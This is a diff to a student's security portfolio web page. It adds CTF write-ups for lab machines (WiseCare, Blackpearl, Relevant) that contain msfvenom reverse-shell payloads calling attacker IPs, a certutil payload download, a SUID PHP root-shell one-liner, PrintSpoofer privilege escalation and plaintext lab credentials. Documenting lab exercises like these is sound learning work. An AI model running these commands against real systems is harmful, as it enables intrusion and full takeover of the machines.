@@ -4,636 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Johnny Tavares | Security Researcher & Developer</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400&display=swap');
-        
-        :root {
-            --primary-cyan: #00e5ff;
-            --secondary-cyan: #0891b2;
-            --dark-bg: #0a0a0a;
-            --card-bg: #111111;
-            --card-hover: #1a1a1a;
-            --text-primary: #ffffff;
-            --text-secondary: #b0b0b0;
-            --text-muted: #808080;
-            --border-color: rgba(0, 229, 255, 0.2);
-            --shadow-color: rgba(0, 229, 255, 0.1);
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--dark-bg);
-            color: var(--text-primary);
-            line-height: 1.6;
-            scroll-behavior: smooth;
-        }
-        
-        /* Header & Navigation */
-        .header {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: rgba(10, 10, 10, 0.95);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid var(--border-color);
-            z-index: 1000;
-            transition: all 0.3s ease;
-        }
-        
-        .nav-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            height: 70px;
-        }
-        
-        .logo {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--primary-cyan);
-            text-decoration: none;
-        }
-        
-        .nav-menu {
-            display: flex;
-            list-style: none;
-            gap: 2rem;
-        }
-        
-        .nav-link {
-            color: var(--text-secondary);
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s ease;
-            position: relative;
-        }
-        
-        .nav-link:hover,
-        .nav-link.active {
-            color: var(--primary-cyan);
-        }
-        
-        .nav-link::after {
-            content: '';
-            position: absolute;
-            bottom: -5px;
-            left: 0;
-            width: 0;
-            height: 2px;
-            background: var(--primary-cyan);
-            transition: width 0.3s ease;
-        }
-        
-        .nav-link:hover::after,
-        .nav-link.active::after {
-            width: 100%;
-        }
-        
-        /* Main Content */
-        .main-content {
-            padding-top: 70px;
-        }
-        
-        .section {
-            padding: 4rem 0;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding-left: 2rem;
-            padding-right: 2rem;
-        }
-        
-        /* Hero Section */
-        .hero {
-            min-height: 90vh;
-            display: flex;
-            align-items: center;
-            background: linear-gradient(135deg, rgba(0, 229, 255, 0.05) 0%, transparent 50%);
-            padding-left: 0;
-            padding-right: 0;
-            max-width: none;
-            margin: 0;
-        }
-        
-        .hero .hero-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 2rem;
-            width: 100%;
-        }
-        
-        .hero-content {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 4rem;
-            align-items: center;
-        }
-        
-        .hero-text h1 {
-            font-size: 3.5rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-            background: linear-gradient(135deg, var(--text-primary) 0%, var(--primary-cyan) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        
-        .hero-text .subtitle {
-            font-size: 1.3rem;
-            color: var(--primary-cyan);
-            font-weight: 500;
-            margin-bottom: 1.5rem;
-        }
-        
-        .hero-text .description {
-            font-size: 1.1rem;
-            color: var(--text-secondary);
-            margin-bottom: 2rem;
-            line-height: 1.7;
-        }
-        
-        .cta-buttons {
-            display: flex;
-            gap: 1rem;
-        }
-        
-        .btn {
-            padding: 0.75rem 2rem;
-            border: none;
-            border-radius: 8px;
-            font-weight: 500;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-        
-        .btn-primary {
-            background: var(--primary-cyan);
-            color: var(--dark-bg);
-        }
-        
-        .btn-primary:hover {
-            background: var(--secondary-cyan);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0, 229, 255, 0.3);
-        }
-        
-        .btn-secondary {
-            background: transparent;
-            color: var(--primary-cyan);
-            border: 2px solid var(--primary-cyan);
-        }
-        
-        .btn-secondary:hover {
-            background: var(--primary-cyan);
-            color: var(--dark-bg);
-        }
-        
-        .hero-stats {
-            background: var(--card-bg);
-            border-radius: 16px;
-            padding: 2rem;
-            border: 1px solid var(--border-color);
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 1.5rem;
-        }
-        
-        .stat-item {
-            text-align: center;
-        }
-        
-        .stat-number {
-            font-size: 2rem;
-            font-weight: 700;
-            color: var(--primary-cyan);
-            display: block;
-        }
-        
-        .stat-label {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-        
-        /* Section Headers */
-        .section-header {
-            text-align: center;
-            margin-bottom: 4rem;
-        }
-        
-        .section-title {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-            color: var(--text-primary);
-        }
-        
-        .section-subtitle {
-            font-size: 1.1rem;
-            color: var(--text-secondary);
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        
-        /* Cards */
-        .card {
-            background: var(--card-bg);
-            border-radius: 12px;
-            padding: 2rem;
-            border: 1px solid var(--border-color);
-            transition: all 0.3s ease;
-            height: 100%;
-        }
-        
-        .card:hover {
-            background: var(--card-hover);
-            border-color: var(--primary-cyan);
-            transform: translateY(-5px);
-            box-shadow: 0 10px 40px var(--shadow-color);
-        }
-        
-        /* About Section */
-        .about-content {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 3rem;
-            margin-bottom: 3rem;
-        }
-        
-        .about-text {
-            font-size: 1.1rem;
-            color: var(--text-secondary);
-            line-height: 1.8;
-        }
-        
-        .expertise-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 2rem;
-            margin-top: 3rem;
-        }
-        
-        .expertise-card {
-            background: var(--card-bg);
-            border-radius: 12px;
-            padding: 2rem;
-            border: 1px solid var(--border-color);
-            transition: all 0.3s ease;
-        }
-        
-        .expertise-card:hover {
-            border-color: var(--primary-cyan);
-            transform: translateY(-5px);
-        }
-        
-        .expertise-icon {
-            width: 48px;
-            height: 48px;
-            background: linear-gradient(135deg, var(--primary-cyan), var(--secondary-cyan));
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 1rem;
-            font-size: 1.5rem;
-        }
-        
-        .expertise-title {
-            font-size: 1.2rem;
-            font-weight: 600;
-            margin-bottom: 1rem;
-            color: var(--text-primary);
-        }
-        
-        .expertise-description {
-            color: var(--text-secondary);
-            line-height: 1.6;
-        }
-        
-        /* Projects Section */
-        .projects-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 2rem;
-        }
-        
-        .project-card {
-            background: var(--card-bg);
-            border-radius: 12px;
-            overflow: hidden;
-            border: 1px solid var(--border-color);
-            transition: all 0.3s ease;
-        }
-        
-        .project-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--primary-cyan);
-            box-shadow: 0 10px 40px var(--shadow-color);
-        }
-        
-        .project-image {
-            width: 100%;
-            height: 200px;
-            background: var(--card-hover);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-bottom: 1px solid var(--border-color);
-        }
-        
-        .project-image img {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: cover;
-            border: none;
-            border-radius: 0;
-            box-shadow: none;
-        }
-        
-        .project-content {
-            padding: 2rem;
-        }
-        
-        .project-title {
-            font-size: 1.3rem;
-            font-weight: 600;
-            margin-bottom: 1rem;
-            color: var(--text-primary);
-        }
-        
-        .project-description {
-            color: var(--text-secondary);
-            margin-bottom: 1.5rem;
-            line-height: 1.6;
-        }
-        
-        .project-tech {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 0.5rem;
-            margin-bottom: 1.5rem;
-        }
-        
-        .tech-tag {
-            background: rgba(0, 229, 255, 0.1);
-            color: var(--primary-cyan);
-            padding: 0.25rem 0.75rem;
-            border-radius: 16px;
-            font-size: 0.85rem;
-            font-weight: 500;
-        }
-        
-        .project-links {
-            display: flex;
-            gap: 1rem;
-        }
-        
-        .project-link {
-            padding: 0.5rem 1rem;
-            background: transparent;
-            color: var(--primary-cyan);
-            border: 1px solid var(--primary-cyan);
-            border-radius: 6px;
-            text-decoration: none;
-            font-size: 0.9rem;
-            font-weight: 500;
-            transition: all 0.3s ease;
-        }
-        
-        .project-link:hover {
-            background: var(--primary-cyan);
-            color: var(--dark-bg);
-        }
-        
-        /* CTF Section */
-        .ctf-grid {
-            display: grid;
-            gap: 2rem;
-        }
-        
-        .ctf-card {
-            background: var(--card-bg);
-            border-radius: 12px;
-            border: 1px solid var(--border-color);
-            overflow: hidden;
-            transition: all 0.3s ease;
-        }
-        
-        .ctf-card:hover {
-            border-color: var(--primary-cyan);
-        }
-        
-        .ctf-header {
-            padding: 1.5rem 2rem;
-            background: rgba(0, 229, 255, 0.05);
-            border-bottom: 1px solid var(--border-color);
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .ctf-title {
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-        
-        .ctf-tactics {
-            color: var(--primary-cyan);
-            font-size: 0.9rem;
-            font-weight: 500;
-        }
-        
-        .ctf-content {
-            padding: 2rem;
-            display: none;
-        }
-        
-        .ctf-content.active {
-            display: block;
-        }
-        
-        .ctf-content h2 {
-            color: var(--primary-cyan);
-            font-size: 1.3rem;
-            margin: 2rem 0 1rem 0;
-        }
-        
-        .ctf-content h3 {
-            color: var(--text-primary);
-            font-size: 1.1rem;
-            margin: 1.5rem 0 0.75rem 0;
-        }
-        
-        .ctf-content p {
-            color: var(--text-secondary);
-            margin-bottom: 1rem;
-            line-height: 1.7;
-        }
-        
-        .ctf-content ul,
-        .ctf-content ol {
-            color: var(--text-secondary);
-            margin: 1rem 0 1rem 2rem;
-        }
-        
-        .ctf-content li {
-            margin-bottom: 0.5rem;
-        }
-        
-        .ctf-content pre {
-            background: #000;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 1rem;
-            overflow-x: auto;
-            margin: 1rem 0;
-            font-family: 'JetBrains Mono', monospace;
-        }
-        
-        .ctf-content code {
-            color: var(--primary-cyan);
-            font-family: 'JetBrains Mono', monospace;
-        }
-        
-        .ctf-content img {
-            max-width: 100%;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-            margin: 1rem 0;
-        }
-        
-        .expand-icon {
-            transition: transform 0.3s ease;
-        }
-        
-        .expand-icon.rotated {
-            transform: rotate(180deg);
-        }
-        
-        /* Footer */
-        .footer {
-            background: var(--card-bg);
-            border-top: 1px solid var(--border-color);
-            padding: 3rem 0;
-            margin-top: 4rem;
-        }
-        
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 2rem;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 3rem;
-            align-items: center;
-        }
-        
-        .footer-info h3 {
-            font-size: 1.5rem;
-            margin-bottom: 1rem;
-            color: var(--primary-cyan);
-        }
-        
-        .footer-info p {
-            color: var(--text-secondary);
-            margin-bottom: 1.5rem;
-        }
-        
-        .social-links {
-            display: flex;
-            gap: 1rem;
-        }
-        
-        .social-link {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            padding: 0.75rem 1.5rem;
-            background: transparent;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-secondary);
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        
-        .social-link:hover {
-            border-color: var(--primary-cyan);
-            color: var(--primary-cyan);
-            transform: translateY(-2px);
-        }
-        
-        .footer-bottom {
-            text-align: center;
-            padding-top: 2rem;
-            border-top: 1px solid var(--border-color);
-            color: var(--text-muted);
-        }
-        
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .nav-menu {
-                display: none;
-            }
-            
-            .hero-content {
-                grid-template-columns: 1fr;
-                text-align: center;
-            }
-            
-            .hero-text h1 {
-                font-size: 2.5rem;
-            }
-            
-            .about-content {
-                grid-template-columns: 1fr;
-            }
-            
-            .footer-content {
-                grid-template-columns: 1fr;
-                text-align: center;
-            }
-            
-            .section {
-                padding-left: 1rem;
-                padding-right: 1rem;
-            }
-        }
-        
-        /* Animations */
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .animate-on-scroll {
-            animation: fadeInUp 0.6s ease-out;
-        }
-    </style>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <!-- Header -->
@@ -644,6 +15,8 @@
                 <li><a href="#about" class="nav-link">About</a></li>
                 <li><a href="#projects" class="nav-link">Projects</a></li>
                 <li><a href="#ctf" class="nav-link">CTF Write-ups</a></li>
+                <li><a href="#blog" class="nav-link">Blog</a></li>
+                <li><a href="#research" class="nav-link">Research</a></li>
                 <li><a href="#contact" class="nav-link">Contact</a></li>
             </ul>
         </nav>
@@ -778,25 +151,6 @@
                         </div>
                     </div>
                 </div>
-
-                <div class="project-card">
-                    <div class="project-image">
-                        <img src="Images/Solitaire.png" alt="XP Solitaire Reverse Engineering" />
-                    </div>
-                    <div class="project-content">
-                        <h3 class="project-title">Game Binary Reverse Engineering</h3>
-                        <p class="project-description">A reverse engineering project analyzing XP Solitaire to uncover internal logic and hidden functionality. Utilized static and dynamic analysis techniques including Ghidra disassembly, x64dbg debugging, and DLL hijacking/proxying in C++.</p>
-                        <div class="project-tech">
-                            <span class="tech-tag">Ghidra</span>
-                            <span class="tech-tag">x64dbg</span>
-                            <span class="tech-tag">C++</span>
-                            <span class="tech-tag">DLL Hijacking</span>
-                        </div>
-                        <div class="project-links">
-                            <a href="#" class="project-link">Documentation</a>
-                        </div>
-                    </div>
-                </div>
             </div>
         </section>
 
@@ -840,4 +194,293 @@
                         <img src="Images/Buter_WiseCare.png" alt="WiseCare Vulnerability Screenshot">
 
                         <h3>Step 4: Generating Malicious Payload with msfvenom</h3>
-                        <p>To take advantage of this, I use
+                        <p>To take advantage of this, I used <strong>msfvenom</strong> to generate a <strong>reverse shell payload</strong>. The payload I generated was designed to execute a shell on my machine with <strong>SYSTEM</strong> privileges when the vulnerable service starts:</p>
+                        <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.206.128 LPORT=7777 -f exe > Wise.exe</code></pre>
+
+                        <h3>Step 5: Transferring the Payload</h3>
+                        <p>I then transferred the <strong>Wise.exe</strong> payload to the <strong>WiseCare</strong> folder located in <code>Program Files (x86)</code>. To do this, I hosted the <strong>Wise.exe</strong> file again using the Python HTTP server, and then used <strong>certutil.exe</strong> to download the payload.</p>
+
+                        <h3>Step 6: Stopping and Restarting the Vulnerable Service</h3>
+                        <p>I stopped the <strong>WiseBootAssistant</strong> service using the following command:</p>
+                        <pre><code>sc stop WiseBootAssistant</code></pre>
+                        <p>Then, I restarted the service with:</p>
+                        <pre><code>sc start WiseBootAssistant</code></pre>
+                        <p>When the service started, it executed the <strong>Wise.exe</strong> payload, which resulted in a <strong>SYSTEM shell</strong> being returned to me.</p>
+                    </div>
+                </div>
+
+                <div class="ctf-card">
+                    <div class="ctf-header" onclick="toggleCTF('ctf-blackpearl')">
+                        <div>
+                            <h3 class="ctf-title">Blackpearl (TCM Security)</h3>
+                            <p class="ctf-tactics">Virtual hosting with /etc/hosts, SUID exploit using PHP</p>
+                        </div>
+                        <span class="expand-icon">▼</span>
+                    </div>
+                    <div id="ctf-blackpearl" class="ctf-content">
+                        <h2>Initial Enumeration</h2>
+                        <p><strong>Nmap</strong> scan reveals open ports <strong>22, 53, and 80</strong>. Port 53 will come into play later.</p>
+                        <h3>Directory Busting</h3>
+                        <p>Source code on port <strong>80</strong> reveals an email address.</p>
+                        <p>Started <strong>directory busting</strong>, but <strong>dirbuster didn't work</strong>. <strong>ffuf</strong> did, likely because the target (like <code>/secret</code>) had no file extension. Seems like ffuf handles this better.</p>
+                        <p>The <code>/secret</code> directory gave no useful results.</p>
+                    
+                        <h3>Recon on Port 53</h3>
+                        <p>Using <strong>dnsrecon</strong>, found a new virtual host entry.</p>
+                        <p>Edited <code>/etc/hosts</code> with <code>sudo nano /etc/hosts</code> to add the machine's IP and domain (e.g., <code>blackpearl.tcm</code>) to our local DNS records.</p>
+                        <p>After restarting the browser and visiting <code>http://blackpearl.tcm</code>, an info page appeared.</p>
+                        <p>Ran <strong>ffuf</strong> again on this domain and discovered a directory called <code>/navigate</code>.</p>
+                        <p>The site was using <strong>Navigate CMS</strong>, which has a known Metasploit exploit.</p>
+                    
+                        <h2>Exploitation</h2>
+                        <p>Used Metasploit's <code>navigate_cms_rce</code> module.</p>
+                        <ul>
+                            <li>Set <code>RHOST</code> to the machine's IP.</li>
+                            <li>Set <code>VHOST</code> to <code>blackpearl.tcm</code>.</li>
+                        </ul>
+                        <p>Ran the module and got a shell. Used the <code>shell</code> command to interact with it.</p>
+                        <p>To get a TTY shell, grabbed a Python one-liner online and updated it to use <code>/bin/bash</code>:</p>
+                        <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+                    
+                        <h2>Privilege Escalation</h2>
+                        <p>Moved into <code>/tmp</code> and ran <strong>linpeas</strong> from the host machine.</p>
+                        <ul>
+                            <li>Used <code>chmod +x</code> to make it executable.</li>
+                            <li>Ran with <code>./linpeas.sh</code>.</li>
+                        </ul>
+                        <p>In the SUID section, found a red-highlighted binary: <code>/usr/bin/php</code>.</p>
+                        <p>Checked <strong>GTFOBins</strong> and found a suitable exploit for SUID PHP:</p>
+                        <pre><code>/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"</code></pre>
+                        <p>This gave a root shell. From there, <code>cd /root</code> to grab the flag.</p>
+                    </div>
+                </div>
+
+                <div class="ctf-card">
+                    <div class="ctf-header" onclick="toggleCTF('ctf-relevant')">
+                        <div>
+                            <h3 class="ctf-title">RELEVANT (TryHackMe)</h3>
+                            <p class="ctf-tactics">Active Directory enumeration via SMB, ASPX reverse shells, Windows privilege escalation using SeImpersonatePrivilege (PrintSpoofer)</p>
+                        </div>
+                        <span class="expand-icon">▼</span>
+                    </div>
+                    <div id="ctf-relevant" class="ctf-content">
+                        <h2>Initial Enumeration</h2>
+                        <ul>
+                            <li>Enumerated SMB shares anonymously using <pre><code>smbclient -L 10.10.230.117 -N</code></pre></li>
+                            <li>Found a custom SMB share: <code>nt4wrksv</code></li>
+                            <li>Domain name: <strong>RELEVANT</strong></li>
+                            <li>SMB signing was <strong>disabled</strong></li>
+                            <li>Anonymous and guest access was allowed to the <code>nt4wrksv</code> share</li>
+                        </ul>
+                        <img src="Images/relevant_smbclient.png" alt="SMB Client Output">
+                    
+                        <h2>Credentials Discovered</h2>
+                        <ul>
+                            <li>Bob: <code>!P@$W0rD!123</code> (Low-privilege user)</li>
+                            <li>Bill: <code>Juw4nnaM4n420696969!$$</code></li>
+                        </ul>
+                    
+                        <p>Unfortunately initial post-compromise techniques such as Kerberoasting, AS-REP Roasting, secretsdump, etc, yielded no viable attack paths or privilege escalation opportunities.</p>
+                    
+                        <h2>Web Enumeration</h2>
+                        <ul>
+                            <li>Performed directory busting on ports <strong>80</strong> and <strong>49663</strong></li>
+                            <li>Discovered <code>nt4wrksv</code> in web directories — linked to SMB share</li>
+                            <li>Confirmed upload access via SMB to the web root</li>
+                        </ul>
+                        
+                        <h2>Exploitation</h2>
+                        <p>Uploaded an <strong>ASPX reverse shell</strong> using SMB which is ideal for IIS/ASP.NET targets.</p>
+                        <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.230.117 LPORT=10.6.36.131 -f aspx > shell.aspx</code></pre>
+                        <p>Triggered the reverse shell through the exposed web path tied to <code>nt4wrksv</code>.</p>
+                        <img src="Images/relevant_priv.png" alt="Privilege Escalation Screenshot">
+                        
+                        <h2>Privilege Escalation</h2>
+                        <ul>
+                            <li>Token impersonation attempts failed</li>
+                            <li>Attempted PrintNightmare exploit — caught by AV, even with a custom DLL</li>
+                            <li>Used <strong>PrintSpoofer</strong> successfully — achieved <strong>NT AUTHORITY\SYSTEM</strong></li>
+                        </ul>
+                        <pre><code>PrintSpoofer64.exe -i -c cmd</code></pre>
+                        <img src="Images/relevant_nt_authority.png" alt="NT Authority System Screenshot">
+                    </div>
+                </div>
+
+                <div class="ctf-card">
+                    <div class="ctf-header" onclick="toggleCTF('ctf-coming-soon')">
+                        <div>
+                            <h3 class="ctf-title">More Write-ups Coming Soon!</h3>
+                            <p class="ctf-tactics">Stay tuned for additional CTF challenges and methodologies</p>
+                        </div>
+                        <span class="expand-icon">▼</span>
+                    </div>
+                    <div id="ctf-coming-soon" class="ctf-content">
+                        <p>More CTF write-ups will be added as I complete them. Each write-up includes detailed methodology, tool usage, and lessons learned. Check back regularly for new content!</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Blog Section -->
+        <section id="blog" class="section">
+            <div class="section-header">
+                <h2 class="section-title">Blog</h2>
+                <p class="section-subtitle">Tutorials and insights on security topics</p>
+            </div>
+            
+            <div class="blog-grid">
+                <div class="blog-card">
+                    <div class="blog-content">
+                        <div class="blog-meta">
+                            <span class="blog-category">Insights</span>
+                            <span class="blog-date">Jul 25, 2025</span>
+                        </div>
+                        <h3 class="blog-title">Reverse Engineering and Cheating Windows XP Games for Fun</h3>
+                        <p class="blog-excerpt">A dive into static and dynamic reverse engineering by analyzing old-school Windows XP games. I explore memory editing, debugging, and modifying in-game behavior—all without source code.</p>
+                        <div class="blog-tags">
+                            <span class="blog-tag">Reverse Engineering</span>
+                            <span class="blog-tag">Game Hacking</span>
+                        </div>
+                        <a href="blog/index.html" class="blog-read-more">Read Full Blog →</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Research Section -->
+        <section id="research" class="section">
+            <div class="section-header">
+                <h2 class="section-title">Security Research</h2>
+                <p class="section-subtitle">Ongoing research projects exploring system internals, exploitation techniques, and emerging security threats.</p>
+            </div>
+            
+            <div class="research-grid">
+                <div class="research-card">
+                    <div class="research-content">
+                        <div class="research-status">
+                            <span class="status-badge in-progress">In Progress</span>
+                        </div>
+                        <h3 class="research-title">Reverse Engineering Memory-Mapped I/O and DMA Behavior in Embedded Firmware</h3>
+                        <p class="research-description">I'm working on reverse engineering firmware from embedded devices to understand how it interacts with hardware memory. The goal is to find out how these binaries control things like 
+                            connected peripherals or system components, and whether there are any security concerns in how they handle memory.</p>
+                        <div class="research-topics">
+                            <span class="topic-tag">Reverse Engineering</span>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+            
+            <div class="research-note">
+                <p><strong>Note:</strong> The research projects shown here are independent and exploratory in nature. While they are not formally published, they reflect my current academic interests and technical investigations. 
+                I plan to complete an honors thesis toward the end of my undergraduate studies, with a focus on hardware security, and hope to contribute to formal research with faculty in that area.
+                </p>
+            </div>
+        </section>
+
+        <!-- Contact Section -->
+        <section id="contact" class="section">
+            <div class="section-header">
+                <h2 class="section-title">Let's Connect</h2>
+                <p class="section-subtitle">Interested in collaborating, discussing security topics, or just want to connect?</p>
+            </div>
+            
+            <div class="footer-content">
+                <div class="footer-info">
+                    <h3>Get In Touch</h3>
+                    <p>Thanks for checking out my work — feel free to explore my projects, read through my CTF write-ups, or connect with me through the links below. I'm always eager to discuss security topics and collaborate on interesting challenges.</p>
+                    <div class="social-links">
+                        <a href="https://www.github.com/johnny-tavares" class="social-link">
+                            📁 GitHub
+                        </a>
+                        <a href="https://www.linkedin.com/in/johnny-tavares" class="social-link">
+                            💼 LinkedIn
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-bottom">
+            <p>&copy; 2025 Johnny Tavares. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Smooth scrolling for navigation links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Active navigation link highlighting
+        window.addEventListener('scroll', () => {
+            let current = '';
+            const sections = document.querySelectorAll('section');
+            
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                const sectionHeight = section.clientHeight;
+                if (scrollY >= (sectionTop - 200)) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            document.querySelectorAll('.nav-link').forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href') === `#${current}`) {
+                    link.classList.add('active');
+                }
+            });
+        });
+
+        // CTF toggle functionality
+        function toggleCTF(ctfId) {
+            const content = document.getElementById(ctfId);
+            const icon = content.previousElementSibling.querySelector('.expand-icon');
+            
+            if (content.classList.contains('active')) {
+                content.classList.remove('active');
+                icon.classList.remove('rotated');
+            } else {
+                // Close all other CTF sections
+                document.querySelectorAll('.ctf-content').forEach(section => {
+                    section.classList.remove('active');
+                });
+                document.querySelectorAll('.expand-icon').forEach(expandIcon => {
+                    expandIcon.classList.remove('rotated');
+                });
+                
+                // Open the clicked section
+                content.classList.add('active');
+                icon.classList.add('rotated');
+            }
+        }
+
+        // Header background on scroll
+        window.addEventListener('scroll', () => {
+            const header = document.querySelector('.header');
+            if (window.scrollY > 100) {
+                header.style.background = 'rgba(10, 10, 10, 0.98)';
+            } else {
+                header.style.background = 'rgba(10, 10, 10, 0.95)';
+            }
+        });
+    </script>
+
+    <script data-goatcounter="https://johnny-tavares.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js">
+    </script>
+</body>
+</html>
